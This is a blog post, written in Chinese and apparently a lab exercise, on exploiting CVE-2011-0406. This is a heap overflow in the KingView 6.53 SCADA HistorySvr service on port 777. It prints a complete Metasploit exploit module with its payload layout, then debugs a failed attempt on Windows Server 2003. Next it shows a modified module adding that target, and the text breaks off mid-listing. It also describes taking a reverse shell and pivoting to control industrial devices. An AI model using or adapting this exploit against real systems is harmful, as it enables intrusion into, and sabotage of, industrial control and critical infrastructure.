<!DOCTYPE html><html lang="zh-CN"><head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<link rel="preconnect" href="//www.googletagmanager.com">
	<link rel="preconnect" href="//zz.bdstatic.com">
	<link rel="preconnect" href="//sp0.baidu.com">
	<link rel="preconnect" href="//www.google-analytics.com">
	<link rel="preconnect" href="//cdn1.lncld.net">
	<link rel="preconnect" href="//unpkg.com">
	<link rel="preconnect" href="//app-router.leancloud.cn">
	<link rel="preconnect" href="//9qpuwspm.api.lncld.net">
	<link rel="preconnect" href="//gravatar.loli.net">

	<title>（工控向）组态王软件漏洞测试验证与利用 | Fstark</title>

	<meta name="HandheldFriendly" content="True">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
	<meta name="generator" content="hexo">
	<meta name="author" content="Fstark">
	<meta name="description" content="">

	
	<meta name="keywords" content="">
	

	
	<link rel="shortcut icon" href="https://i.loli.net/2017/11/26/5a19c0b50432e.png">
	<link rel="apple-touch-icon" href="https://i.loli.net/2017/11/26/5a19c0b50432e.png">
	

	
	<meta name="theme-color" content="#3c484e">
	<meta name="msapplication-TileColor" content="#3c484e">
	

	

	

	<meta property="og:site_name" content="Fstark">
	<meta property="og:type" content="article">
	<meta property="og:title" content="（工控向）组态王软件漏洞测试验证与利用 | Fstark">
	<meta property="og:description" content="">
	<meta property="og:url" content="http://example.com/2019/10/20/%EF%BC%88%E5%B7%A5%E6%8E%A7%E5%90%91%EF%BC%89%E7%BB%84%E6%80%81%E7%8E%8B%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E9%AA%8C%E8%AF%81%E4%B8%8E%E5%88%A9%E7%94%A8/">

	
	<meta property="article:published_time" content="2019-10-20T03:10:00+08:00"> 
	<meta property="article:author" content="Fstark">
	<meta property="article:published_first" content="Fstark, /2019/10/20/%EF%BC%88%E5%B7%A5%E6%8E%A7%E5%90%91%EF%BC%89%E7%BB%84%E6%80%81%E7%8E%8B%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E9%AA%8C%E8%AF%81%E4%B8%8E%E5%88%A9%E7%94%A8/">
	

	
	
	
<link rel="stylesheet" href="/css/allinonecss.min.css">


	
	
	
</head>

<body class="post-template">
	<div class="site-wrapper">
		




<header class="site-header post-site-header outer">
    <div class="inner">
        
<nav class="site-nav"> 
    <div class="site-nav-left">
        <ul class="nav">
            <li>
                
                <a href="/" title="Home">HOME</a>
                
            </li>
            
            
            <li>
                <a href="/about" title="ABOUT">ABOUT</a>
            </li>
            
            
        </ul> 
    </div>
    
    <div class="search-button-area">
        <a href="#search" class="search-button">Search ...</a>
    </div>
     
    <div class="site-nav-right">
        
        <a href="#search" class="search-button">Search ...</a>
         
        
<div class="social-links">
    
    
    
    
    
    <a class="social-link" title="telegram" href="https://t.me/Fstarkss" target="_blank" rel="noopener">
        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg"><path d="M679.428571 746.857143l84-396q5.142857-25.142857-6-36t-29.428571-4L234.285714 501.142857q-16.571429 6.285714-22.571428 14.285714t-1.428572 15.142858 18.285715 11.142857l126.285714 39.428571 293.142857-184.571428q12-8 18.285714-3.428572 4 2.857143-2.285714 8.571429l-237.142857 214.285714-9.142857 130.285714q13.142857 0 25.714285-12.571428l61.714286-59.428572 128 94.285715q36.571429 20.571429 46.285714-21.714286z m344.571429-234.857143q0 104-40.571429 198.857143t-109.142857 163.428571-163.428571 109.142857-198.857143 40.571429-198.857143-40.571429-163.428571-109.142857-109.142857-163.428571T0 512t40.571429-198.857143 109.142857-163.428571T313.142857 40.571429 512 0t198.857143 40.571429 163.428571 109.142857 109.142857 163.428571 40.571429 198.857143z"></path></svg>
    </a>
    
    
    
</div>
    </div>
</nav>
    </div>
</header>


<div id="site-main" class="site-main outer" role="main">
    <div class="inner">
        <header class="post-full-header">
            <div class="post-full-meta">
                <time class="post-full-meta-date" datetime="2019-10-20T03:24:38.000Z">
                    2019-10-20
                </time>
                
                <span class="date-divider">/</span>
                
                <a href="/categories/%E5%B7%A5%E6%8E%A7/">工控</a>&nbsp;&nbsp;
                
                
            </div>
            <h1 class="post-full-title">（工控向）组态王软件漏洞测试验证与利用</h1>
        </header>
        <div class="post-full ">
            
            <figure class="post-full-image" style="background-image: url(https://tva1.sinaimg.cn/large/006y8mN6ly1g7z6iwd0b9j315z0qdaro.jpg)">
            </figure>
            
            <div class="post-full-content">
                <article id="photoswipe" class="markdown-body">
                    <p>​        WellinTech KingView 6.53 版本中的 HistorySvr.exe 中存在基于堆的缓冲区溢出漏洞。需要掌握远程攻击的方式借助对 TCP 端口 777 的超长请求执行任意代码，实现在 windows 操作员站上的漏洞利用。</p>
<a id="more"></a>

<h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><h3 id="组态王-KingView"><a href="#组态王-KingView" class="headerlink" title="组态王 KingView"></a>组态王 KingView</h3><p>​        亚控科技是国内较早成立的自动化软件企业之一，专注于自主研发、市场营销和服务。 1995 年率先推出组态软件 KingView 系列产品，创立组态王品牌，经过近 20 年的快速发展， 目前公司的产品涵盖设备或工段级监控平台、厂级或集团级监控平台、生产实时智能平台， 产品及方案广泛应用于市政、油气、电力、矿山、物流、汽车、大型设备等行业。</p>
<p>​        设备或工段级监控平台即组态王 KingView 系列产品侧重于对各种设备运行状态、某个 工段或生产线运行情况的监视控制，厂级或集团级监控平台即 KingIOServer、KingSCADA、 KingHistria产品侧重于厂级或集团级生产运营情况的全面监控及管理;生产管理平台即 KingFusion 产品则侧重实现产线监控和生产管理的完美结合。</p>
<h2 id="CVE-2011-0406"><a href="#CVE-2011-0406" class="headerlink" title="CVE-2011-0406"></a>CVE-2011-0406</h2><p>​        CVE-2011-0406 所描述的是亚控组态软件 KingView 6.53 存在的一个缓冲区溢出漏洞, 通过反汇编逆向分析结合动态调试可以发现该漏洞的成因,并可构造攻击代码对其所在上位 机进行攻击,进而获得上位机的远程控制权限。</p>
<p>​        亚控组态软件 KingView 6.53 是运行在 windows 系列操作系统上的组态软件，是亚控 公司推出的一款针对中小型项目推出的用于监视与控制自动化设备和过程的 SCADA 产品, 支持连接 1000 多个厂家近 4000 种设备，支持包括主流 PLC、变频器、仪表、特殊模块、板 卡及电力、楼宇等协议。通过分析发现安装Ki䏰槖iew6.53 软件后，系统会启动 HistorySvr.exe 进程并会以系统服务形式在上位机中运行，该服务会在 TCP 的 777 端口监听接收数据，在 接收到数据后 HistorySvr.exe 程序会有 3 次拷贝操作，前两次各 0x4000 字节，最后一次 0xC 字节，共计 0x800C(32780)字节，在写入缓冲区时，对数据校验不严格导致堆缓冲区溢出 而执行任意代码。通过构造带有 shellcode 的恶意数据包向目标主机的 777 端口进行发送即 可触发该漏洞</p>
<p>​        HistorySvr.exe 进程循环接收业务数据(传感器上报数据)，当接收到 异常格式的业务数据后进行数据处理时没有对数据长度进行严格校验，导致异常数据会覆盖缓冲区空间，当 CPU 按照指针地址执行指令时会跳转到攻击者设计好的 shellcode地址进行执行，导致执行攻击者构造的攻击代码。在实验过程中可以利用meatasploit攻击框架工具构造攻击代码，主要攻击载荷如下:</p>
<figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sploit&lt; &lt; make_nops(<span class="number">1020</span>)</span><br><span class="line">sploit&lt; &lt; <span class="string">"\xC4\x04\x2B\x01"</span></span><br><span class="line">sploit&lt; &lt; payload.encoded</span><br><span class="line">sploit&lt; &lt; <span class="string">"x44"</span>* (<span class="number">31752</span>-payload.encoded.length) 	</span><br><span class="line">sploit&lt; &lt; [target.ret].pack(<span class="string">'V'</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>​        通过代码可看出数据包前 1020 位使用指令用来占位，接下来 4 位是我们构造的反向连接 shellcode 在内存空间中的地址，后面是加密后的shellcode 代码，然后用(31752-shellcode长度)位的 A 字符来填充补位，最后是用来覆盖 eax 寄存器的跳转地址。</p>
<p>​        通过缓冲区溢出漏洞可覆盖 eax 寄存器的数据，导致程序执行到 call dword ptr[eax+c] 时指针跳转到 shellcode地址进行执行，在实际测试中可以使用metasploit构造不同类型的shellcode，可以构造反向连接类型 shellcode。使用metasploit进行攻击测试的时候需要设置 3 个参数，RHOST为远程上位机IP 地址，RPORT为 HistorySvr.exe 进程监听端口，payload为攻击载荷shellcode。</p>
<p>​        设置好攻击目标及端口，并加载好shellcode 后可以使用 run命令进行攻击测试，攻击成功后会获得反向连接的控制权限，并可使用metasploit自带的工具meterpreter在远程机器上执行系统命令进行远程控制。</p>
<p>​        获得系统权限后可以该上位机为跳板对系统内其他设备进行二次渗透，可窃取系统运行数据、向传感器节点发送控制指令、使用病毒感染系统内网其他服务器，进而危害整个工控系统及基础设施安全。</p>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a><strong>实验环境</strong></h2><p><img alt="截屏2019-10-15下午9.17.54" class="post-img b-lazy" data-img="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z76ec19gj30cn02qt8o.jpg" data-index="0" data-src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z76ec19gj30cn02qt8o.jpg"></p>
<p>​    Windows Server 2003:KingView 6.53<br>​    Kali Linux:metasploit、Python等</p>
<p>​    网卡：Server2003 与Kali桥接为同一网卡</p>
<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a><strong>实验步骤</strong></h2><h3 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h3><p>​        收集 CVE-2011-0406 的信息和 EXP</p>
<figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># $Id$</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This file is part of the Metasploit Framework and may be subject to</span></span><br><span class="line"><span class="comment"># redistribution and commercial restrictions. Please see the Metasploit</span></span><br><span class="line"><span class="comment"># Framework web site for more information on licensing and terms of use.</span></span><br><span class="line"><span class="comment"># http://metasploit.com/framework/</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">'msf/core'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Metasploit3</span> &lt; Msf::Exploit::<span class="title">Remote</span></span></span><br><span class="line">	Rank = GoodRanking</span><br><span class="line"></span><br><span class="line">	<span class="keyword">include</span> Msf::Exploit::Remote::Tcp</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(info={})</span></span></span><br><span class="line">		<span class="keyword">super</span>(update_info(info,</span><br><span class="line">			<span class="string">'Name'</span>        =&gt; <span class="string">"Kingview 6.53 SCADA HMI HistorySvr Heap Overflow"</span>,</span><br><span class="line">			<span class="string">'Description'</span> =&gt; <span class="string">%q{</span></span><br><span class="line"><span class="string">				This module exploits a buffer overflow in Kingview 6.53.  By sending a specially</span></span><br><span class="line"><span class="string">				crafted request to port 777 (HistorySvr.exe), a remote attacker may be able to</span></span><br><span class="line"><span class="string">				gain arbitrary code execution without authentication.</span></span><br><span class="line"><span class="string">			}</span>,</span><br><span class="line">			<span class="string">'License'</span>	  =&gt; MSF_LICENSE,</span><br><span class="line">			<span class="string">'Version'</span>	  =&gt; <span class="string">"$Revision$"</span>,</span><br><span class="line">			<span class="string">'Author'</span>      =&gt;</span><br><span class="line">				[</span><br><span class="line">					<span class="string">'Dillon Beresford'</span>,  <span class="comment">#Found by Dillon</span></span><br><span class="line">					<span class="string">'rick2600'</span>,          <span class="comment">#XP SP3 execution</span></span><br><span class="line">				],</span><br><span class="line">			<span class="string">'References'</span> =&gt;</span><br><span class="line">				[</span><br><span class="line">					[<span class="string">'CVE'</span>, <span class="string">'2011-0406'</span>],</span><br><span class="line">					[<span class="string">'OSVDB'</span>, <span class="string">'70366'</span>],</span><br><span class="line">					[<span class="string">'Bugtraq'</span>, <span class="string">'45727'</span>],</span><br><span class="line">					[<span class="string">'URL'</span>, <span class="string">'http://www.exploit-db.com/exploits/15957'</span>],</span><br><span class="line">					[<span class="string">'URL'</span>, <span class="string">'http://www.kb.cert.org/vuls/id/180119'</span>],</span><br><span class="line">					[<span class="string">'URL'</span>, <span class="string">'http://thesauceofutterpwnage.blogspot.com/2011/01/waking-up-sleeping-dragon.html'</span>],</span><br><span class="line">				],</span><br><span class="line">			<span class="string">'Payload'</span>	 =&gt;</span><br><span class="line">				{</span><br><span class="line">					<span class="string">'BadChars'</span> =&gt; <span class="string">"\x00\x0d\x0a\xff"</span></span><br><span class="line">				},</span><br><span class="line">			<span class="string">'Platform'</span> =&gt; <span class="string">'win'</span>,	</span><br><span class="line">			<span class="string">'Targets'</span>	 =&gt;</span><br><span class="line">				[</span><br><span class="line">					[ <span class="string">'Windows XP SP1'</span>, {<span class="string">'Ret'</span> =&gt; <span class="number">0x77ED73B4</span>} ], <span class="comment">#UnhandledExceptionFilter() in kernel32.dll</span></span><br><span class="line">					[ <span class="string">'Windows XP SP3 EN'</span>, {<span class="string">'Ret'</span> =&gt; <span class="number">0x00A1FB84</span>} ],</span><br><span class="line">				],</span><br><span class="line">			<span class="string">'DisclosureDate'</span> =&gt; <span class="string">"9/28/2010"</span>,</span><br><span class="line">			<span class="string">'DefaultTarget'</span> =&gt; <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">			register_options( [ Opt::RPORT(<span class="number">777</span>) ], <span class="keyword">self</span>.<span class="keyword">class</span> )</span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">exploit</span></span></span><br><span class="line">		sploit = <span class="string">''</span></span><br><span class="line">		<span class="keyword">if</span> target.name =~ <span class="regexp">/XP SP1/</span></span><br><span class="line"></span><br><span class="line">			sploit &lt;&lt; make_nops(<span class="number">32812</span>)</span><br><span class="line">			sploit &lt;&lt; <span class="string">"\xEB\x10"</span></span><br><span class="line">			sploit &lt;&lt; <span class="string">"\x41"</span>*<span class="number">6</span></span><br><span class="line">			sploit &lt;&lt; <span class="string">"\xAD\xBB\xC3\x77"</span></span><br><span class="line">			sploit &lt;&lt; [target.ret].pack(<span class="string">'V'</span>)</span><br><span class="line">			sploit &lt;&lt; make_nops(<span class="number">8</span>)</span><br><span class="line">			sploit &lt;&lt; payload.encoded</span><br><span class="line">			sploit &lt;&lt; <span class="string">"\x44"</span>*(<span class="number">1000</span>-payload.encoded.length)</span><br><span class="line">			<span class="comment">#this makes the app more crashy, need to investigatev</span></span><br><span class="line">			<span class="comment">#sploit &lt;&lt; make_nops(1000-payload.encoded.length) </span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">elsif</span> target.name =~ <span class="regexp">/XP SP3/</span></span><br><span class="line"></span><br><span class="line">			sploit &lt;&lt; make_nops(<span class="number">1024</span>)</span><br><span class="line">			sploit &lt;&lt; payload.encoded</span><br><span class="line">			sploit &lt;&lt; <span class="string">"\x44"</span>*(<span class="number">31752</span>-payload.encoded.length)</span><br><span class="line">			<span class="comment">#rand_text_alpha_xxx() unfortunately makes it a bit unstable,</span></span><br><span class="line">			<span class="comment">#not ready to implement</span></span><br><span class="line">			<span class="comment">#sploit &lt;&lt; rand_text_alpha_upper(32776-sploit.length)</span></span><br><span class="line">			sploit &lt;&lt; [target.ret].pack(<span class="string">'V'</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">		connect</span><br><span class="line"></span><br><span class="line">		print_status(<span class="string">"Trying target <span class="subst">#{target.name}</span>"</span>)</span><br><span class="line">		sock.write(sploit)</span><br><span class="line"></span><br><span class="line">		select(<span class="literal">nil</span>, <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="number">5</span>)</span><br><span class="line">		handler</span><br><span class="line">		disconnect</span><br><span class="line"></span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></tbody></table></figure>
<p>​        将 rb 脚本存放至 metasploit的相应安装目录中进行调用。 例如:/exploits/windows/scada</p>
<p>​        开启 KingView6.53 打开软件预制 Kingdemo 工程。</p>
<p><img alt="截屏2019-10-15下午9.24.03" class="post-img b-lazy" data-img="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7csvgf1j31h70tb1kx.jpg" data-index="1" data-src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7csvgf1j31h70tb1kx.jpg"></p>
<p>​        确认目标及其 777 端口已经开放，并且防火墙是关闭状态。</p>
<p><img alt="截屏2019-10-15下午3.47.16" class="post-img b-lazy" data-img="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7eecdghj30jm0awgor.jpg" data-index="2" data-src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7eecdghj30jm0awgor.jpg"></p>
<h3 id="攻击尝试"><a href="#攻击尝试" class="headerlink" title="攻击尝试"></a>攻击尝试</h3><p>​        开启 Kali 安全测试主机作为攻击测试主机，确认msf框架 exploit 攻击代码录入并保存在/usr/share/metasploit-framework/modules/expolits/windows/scada 目录下。</p>
<p><img alt="截屏2019-10-15下午9.29.02" class="post-img b-lazy" data-img="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7hwlsxij312h0iljtt.jpg" data-index="3" data-src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7hwlsxij312h0iljtt.jpg"></p>
<p>​        启动metasploit，加载kingview模块</p>
<p><img alt="截屏2019-10-15下午4.53.55" class="post-img b-lazy" data-img="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7jk1c1sj30p20icwp4.jpg" data-index="4" data-src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7jk1c1sj30p20icwp4.jpg"></p>
<p>​        查看攻击靶机ip地址，置入 RHOST 参数中。进行攻击尝试。</p>
<p><img alt="截屏2019-10-15下午5.21.34" class="post-img b-lazy" data-img="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7k7ok7cj30p20ich4a.jpg" data-index="5" data-src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7k7ok7cj30p20ich4a.jpg"></p>
<p>​        由于攻击代码中并没有包含 windows Server 2003 版本，因此攻击未成功。</p>
<h3 id="分析漏洞"><a href="#分析漏洞" class="headerlink" title="分析漏洞"></a>分析漏洞</h3><p>​        我们可以看到目标靶机中的kingview服务已经停止，并且异常调试工具已经启动。</p>
<p><img alt="截屏2019-10-15下午5.39.21" class="post-img b-lazy" data-img="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7lxgfzcj30m80htgoe.jpg" data-index="6" data-src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7lxgfzcj30m80htgoe.jpg"></p>
<p>​        这表明 HistorySvr.exe 程序中的漏洞已经被触发且产生影响，只是 shellcode 并未在目标靶机中运行，程序执行未跳转到指定 shellcode 位置。</p>
<p>​        通过查看 OllyDbg 中 view—&gt;log，可以看到程序终止在地址为 0x77F47530，异常原因 为 Access violation when reading [00B5084D]。</p>
<p><img alt="截屏2019-10-15下午6.58.20" class="post-img b-lazy" data-img="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7onss9gj31g30suju7.jpg" data-index="7" data-src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7onss9gj31g30suju7.jpg"></p>
<p>​        观察程序发生异常时执行代码为mov cl, byte ptr  [eax + 5]，即程序将执行该指针位置处的指令，然而该地址值为 0x00B5084D，并未获取到可执行指令。</p>
<p>​        利用代码针对目标为“windows XP SP3 EN”系统的返回地址 Ret 为异常时 EAX 寄存器 的值 0x00B50848。</p>
<h3 id="修改利用代码"><a href="#修改利用代码" class="headerlink" title="修改利用代码"></a>修改利用代码</h3><p>​        重新打开漏洞利用代码进行编辑，targets 中加入“windows 2003 SP0 EN”，target.name 加入“2003 SP0”，Ret 值暂时随意填写，exploit 函数构造溢出包时，加入定位字符“ABCA” 便于我们定位 payload 地址位置，具体代码如下所示。</p>
<figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'msf/core'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Metasploit3</span> &lt; Msf::Exploit::<span class="title">Remote</span></span></span><br><span class="line">	Rank = GoodRanking</span><br><span class="line"></span><br><span class="line">	<span class="keyword">include</span> Msf::Exploit::Remote::Tcp</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(info={})</span></span></span><br><span class="line">		<span class="keyword">super</span>(update_info(info,</span><br><span class="line">			<span class="string">'Name'</span>        =&gt; <span class="string">"Kingview 6.53 SCADA HMI HistorySvr Heap Overflow"</span>,</span><br><span class="line">			<span class="string">'Description'</span> =&gt; <span class="string">%q{</span></span><br><span class="line"><span class="string">				This module exploits a buffer overflow in Kingview 6.53.  By sending a specially</span></span><br><span class="line"><span class="string">				crafted request to port 777 (HistorySvr.exe), a remote attacker may be able to</span></span><br><span class="line"><span class="string">				gain arbitrary code execution without authentication.</span></span><br><span class="line"><span class="string">			}</span>,</span><br><span class="line">			<span class="string">'License'</span>	  =&gt; MSF_LICENSE,</span><br><span class="line">			<span class="string">'Version'</span>	  =&gt; <span class="string">"$Revision$"</span>,</span><br><span class="line">			<span class="string">'Author'</span>      =&gt;</span><br><span class="line">				[</span><br><span class="line">					<span class="string">'Dillon Beresford'</span>,  <span class="comment">#Found by Dillon</span></span><br><span class="line">					<span class="string">'rick2600'</span>,          <span class="comment">#XP SP3 execution</span></span><br><span class="line">				],</span><br><span class="line">			<span class="string">'References'</span> =&gt;</span><br><span class="line">				[</span><br><span class="line">					[<span class="string">'CVE'</span>, <span class="string">'2011-0406'</span>],</span><br><span class="line">					[<span class="string">'OSVDB'</span>, <span class="string">'70366'</span>],</span><br><span class="line">					[<span class="string">'Bugtraq'</span>, <span class="string">'45727'</span>],</span><br><span class="line">					[<span class="string">'URL'</span>, <span class="string">'http://www.exploit-db.com/exploits/15957'</span>],</span><br><span class="line">					[<span class="string">'URL'</span>, <span class="string">'http://www.kb.cert.org/vuls/id/180119'</span>],</span><br><span class="line">					[<span class="string">'URL'</span>, <span class="string">'http://thesauceofutterpwnage.blogspot.com/2011/01/waking-up-sleeping-dragon.html'</span>],</span><br><span class="line">				],</span><br><span class="line">			<span class="string">'Payload'</span>	 =&gt;</span><br><span class="line">				{</span><br><span class="line">					<span class="string">'BadChars'</span> =&gt; <span class="string">"\x00\x0d\x0a\xff"</span></span><br><span class="line">				},</span><br><span class="line">			<span class="string">'Platform'</span> =&gt; <span class="string">'win'</span>,	</span><br><span class="line">			<span class="string">'Targets'</span>	 =&gt;</span><br><span class="line">				[</span><br><span class="line">					[ <span class="string">'Windows XP SP1'</span>, {<span class="string">'Ret'</span> =&gt; <span class="number">0x77ED73B4</span>} ], <span class="comment">#UnhandledExceptionFilter() in kernel32.dll</span></span><br><span class="line">					[ <span class="string">'Windows XP SP3 EN'</span>, {<span class="string">'Ret'</span> =&gt; <span class="number">0x00A1FB84</span>} ],</span><br><span class="line">					[ <span class="string">'Windows 2003 SP0 EN'</span>, {<span class="string">'Ret'</span> =&gt; <span class="number">0x00B50848</span>} ],<span class="comment">#newtarget</span></span><br><span class="line">				],</span><br><span class="line">			<span class="string">'DisclosureDate'</span> =&gt; <span class="string">"9/28/2010"</span>,</span><br><span class="line">			<span class="string">'DefaultTarget'</span> =&gt; <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">			register_options( [ Opt::RPORT(<span class="number">777</span>) ], <span class="keyword">self</span>.<span class="keyword">class</span> )</span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">exploit</span></span></span><br><span class="line">		sploit = <span class="string">''</span></span><br><span class="line">		<span class="keyword">if</span> target.name =~ <span class="regexp">/XP SP1/</span></span><br><span class="line"></span><br><span class="line">			sploit &lt;&lt; make_nops(<span class="number">32812</span>)</span><br><span class="line">			sploit &lt;&lt; <span class="string">"\xEB\x10"</span></span><br><span class="line">			sploit &lt;&lt; <span class="string">"\x41"</span>*<span class="number">6</span></span><br><span class="line">			sploit &lt;&lt; <span class="string">"\xAD\xBB\xC3\x77"</span></span><br><span class="line">			sploit &lt;&lt; [target.ret].pack(<span class="string">'V'</span>)</span><br><span class="line">			sploit &lt;&lt; make_nops(<span class="number">8</span>)</span><br><span class="line">			sploit &lt;&lt; payload.encoded</span><br><span class="line">			sploit &lt;&lt; <span class="string">"\x44"</span>*(<span class="number">1000</span>-payload.encoded.length)</span><br><span class="line">			<span class="comment">#this makes the app more crashy, need to investigatev</span></span><br><span class="line">			<span class="comment">#sploit &lt;&lt; make_nops(1000-payload.encoded.length) </span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">elsif</span> target.name =~ <span class="regexp">/XP SP3/</span></span><br><span class="line"></span><br><span class="line">			sploit &lt;&lt; make_nops(<span class="number">1024</span>)</span><br><span class="line">			sploit &lt;&lt; payload.encoded</span><br><span class="line">			sploit &lt;&lt; <span class="string">"\x44"</span>*(<span class="number">31752</span>-payload.encoded.length)</span><br><span class="line">			<span class="comment">#rand_text_alpha_xxx() unfortunately makes it a bit unstable,</span></span><br><span 